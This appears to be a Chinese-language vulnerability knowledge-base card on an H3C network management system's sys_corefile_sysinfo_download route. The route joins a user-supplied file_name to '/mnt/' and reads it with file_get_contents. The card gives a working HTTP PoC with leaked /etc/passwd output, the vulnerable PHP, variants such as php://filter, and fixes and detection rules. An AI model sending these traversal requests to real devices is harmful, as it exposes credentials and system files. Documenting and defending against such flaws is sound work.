---
id: web-php-file-inclusion-h3c-mds-syscorefile-filename-traversal-read
title: H3C 网管系统 .mds 路由 sys_corefile_sysinfo_download：file_name 直拼 /mnt/ 前缀、../ 穿越 file_get_contents 任意文件读取
type: scenario
domain: web
path: web/php/file-inclusion
technique: h3c-mds-syscorefile-filename-traversal-file-read
tags:
- php
- file-read
- path-traversal
- file-get-contents
- h3c
- mds
- source-audit
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V551
  verified_at: '2026-11-11T22:37:29+08:00'
  notes: 已对照原文 content.md 与全部 17 张截图核对：图6 源码 file_access_control($_GET['file_name']) 后 $fname='/mnt/'.$_GET['file_name']; file_get_contents($fname) 回显，未做 ../ 过滤；图5 index.php 以 $_GET['g'] 路由并对非 nobusiness_/main 路由做 Referer 包含 Host 检查；图7 实测 GET /webui/index.php?file_name=../../../../../../etc/passwd&g=sys_corefile_sysinfo_download 返回 200 text/plain 及 /etc/passwd 内容（root/nobody/sshd/postgres），与卡内 PoC 一致。修正核对：".mds 不被 PhpStorm 全局搜索索引" 与图1 相符；其余 .php file_get_contents（https_post/sms_data.txt）均静态不可控，仅该 .mds 分支可控，判断成立。dedup 仅自身 exact，其余候选为 editor uploads 前缀穿越、h3blog、用友、万户 OA 等其他产品/入口，无同链重复。原文未标注 H3C 具体版本，未设 affected_versions。未验证点：(1) 图5 代码要求同 Host Referer，但图7 实测请求未带 Referer 仍返回文件，实际部署可能未强制该检查/版本差异，卡内 PoC 保留 Referer 属保守写法；(2) 未复测其他版本与 open_basedir 限制场景。
url: /docs/web/php/file-inclusion/web-php-file-inclusion-h3c-mds-syscorefile-filename-traversal-read/
draft: false
kb_aliases:
- H3C 网管系统任意文件读取
- sys_corefile_sysinfo_download
- .mds 路由
- g 参数路由
- file_name 目录穿越
- file_get_contents 任意文件读取
---

## 一句话结论

H3C 网管系统的路由由 GET 参数 `g` 选择，处理逻辑集中在不被 IDE 全局索引的 `.mds` 文件中；`g=sys_corefile_sysinfo_download` 对应处理函数把用户可控的 `file_name` 直接拼在固定前缀 `/mnt/` 后交给 `file_get_contents()` 并回显文件内容，传入 `../../../../../../etc/passwd` 即可目录穿越读取服务器任意文件。

## 原理

- **路由与文件布局**：系统入口为 `/webui/index.php`，`$get_url_param = $_GET['g']` 决定进入哪个处理分支；大量业务逻辑写在 `modules/*.mds` 文件中，`PhpStorm` 等 IDE 的全局搜索默认不索引 `.mds`，直接搜 `.php` 会漏掉这些路由，这是审计时容易忽略的前提。
- **危险 sink**：`sys_corefile_sysinfo_download` 分支中，代码执行 `$fname = "/mnt/".$_GET['file_name']; $data = file_get_contents($fname);`，随后设置 `Content-Type: text/plain`、`Content-Disposition: attachment; filename=<file_name>` 并 `echo $data`。`file_name` 没有做 `../` 过滤或 `realpath` 前缀校验，拼接后的路径可跳出 `/mnt/`。
- **为什么能读任意文件**：Linux 路径中 `../` 会被内核逐级解析，`/mnt/../../../../etc/passwd` 最终等价于 `/etc/passwd`；`file_get_contents()` 对普通文件路径直接读取，不限制目录，因此只要 Web 进程有读权限的文件都能读取（配置、密钥、`/etc/passwd`、业务源码等）。
- **file_access_control 不能兜底**：处理函数虽然先调用了 `file_access_control($_GET['file_name'])`，但后续仍使用原始 `$_GET['file_name']` 拼接读取，校验没有对读取路径生效（或仅做业务级检查），不构成目录穿越防护。

## 触发条件

- 能访问系统 `/webui/index.php` 并具备有效会话（原文请求携带 `USGSESSID` Cookie；是否需要管理员权限取决于部署的鉴权配置）。
- 目标为使用该 `.mds` 路由框架的 H3C 网管系统版本，`sys_corefile_sysinfo_download` 分支存在且 Web 进程对目标文件有读权限。
- 请求可通过 `g=sys_corefile_sysinfo_download` 进入该分支（全局 Referer 校验对 `nobusiness_` 前缀或 `main` 放行，其他路由要求 Referer 包含当前 Host）。

## 利用步骤

1. 确认入口与路由参数：访问 `/webui/index.php`，观察 URL 中的 `g=` 参数与对应 `.mds` 模块。
2. 构造穿越路径：把 `file_name` 设为相对 `/mnt/` 的 `../` 序列，例如读 `/etc/passwd` 用 `../../../../../../etc/passwd`（层数按实际目录深度调整）。
3. 发送请求：`GET /webui/index.php?file_name=<payload>&g=sys_corefile_sysinfo_download`，带有效 Cookie 与同 Host Referer。
4. 读取响应：响应为 `text/plain` 附件，正文即目标文件内容；对二进制文件可用 `php://filter/convert.base64-encode/resource=...` 等封装器（若 `allow_url_fopen`/filter 可用）避免乱码。
5. 按需读取 `/mnt/` 下业务配置、数据库口令、会话密钥、系统 `/etc/shadow`（需 root 权限）等敏感文件，评估后续利用。

## PoC

```http
GET /webui/index.php?file_name=../../../../../../etc/passwd&g=sys_corefile_sysinfo_download HTTP/1.1
Host: <target>
Cookie: USGSESSID=<session>
Referer: https://<target>/webui/
User-Agent: Mozilla/5.0

HTTP/1.1 200 OK
Content-Type: text/plain
Content-Disposition: attachment; filename=../../../../../../etc/passwd

root:x:0:0:root:/root:/bin/bash
...
```

对应 PHP 代码（去混淆后）：

```php
if ($get_url_param == 'sys_corefile_sysinfo_download') {
    file_access_control($_GET['file_name']);
    $fname = "/mnt/".$_GET['file_name'];
    $data = file_get_contents($fname);
    Header("Content-Type: text/plain");
    Header("Content-Length: ".strlen($data));
    Header("Content-Disposition: attachment; filename=".$_GET['file_name']);
    echo $data;
    exit();
}
```

## 变体与关联

- 变体：同一 `.mds` 框架中其他处理函数也存在 `file_get_contents`/`fopen` 拼接用户参数的模式，可全局搜索 `.mds` 内的文件函数并结合 `$_GET`/`$_POST` 追踪。
- 变体：`file_name` 使用绝对路径（如 `/etc/passwd`）在部分实现对 `/mnt/` 前缀拼接不敏感时也可直接读取；`php://filter` 封装器可用于读取 PHP 源码。
- 关联：[[web-php-file-inclusion-editor-file-get-contents-uploads-prefix-traversal]]（file_get_contents 前缀拼接目录穿越的同类模式）、[[web-generic-file-inclusion-dotnet-handler-gettxt-path-read]]（path 直拼读取站点文件）、[[web-php-file-inclusion-url-domain-check-local-path-bypass]]（本地路径绕过域名校验读取任意文件）。
- 边界：需要文件读权限与有效会话；`open_basedir` 限制可能阻止读取 `/mnt` 之外路径；SELinux/容器挂载限制会影响可读范围。

## 检测与防御

- 修复：对 `file_name` 做白名单（仅允许固定文件名/后缀），用 `basename()` 去掉路径分隔符，并以 `realpath()` 校验最终路径必须位于 `/mnt/` 前缀内；禁止把用户输入直接拼进文件路径。
- 加固：`open_basedir` 限制 Web 进程可读目录；敏感配置与系统文件最小权限；关闭不必要的下载/诊断路由。
- 检测：Web 日志中出现 `g=sys_corefile_sysinfo_download` 且 `file_name` 含 `../`、绝对路径、`php://`、`file://` 的请求；异常读取 `/etc/passwd`、`/etc/shadow`、业务 `config` 文件的行为。
- 审计：把 `.mds`、`.inc` 等非标准后缀纳入代码扫描范围，避免 IDE/SAST 漏检。
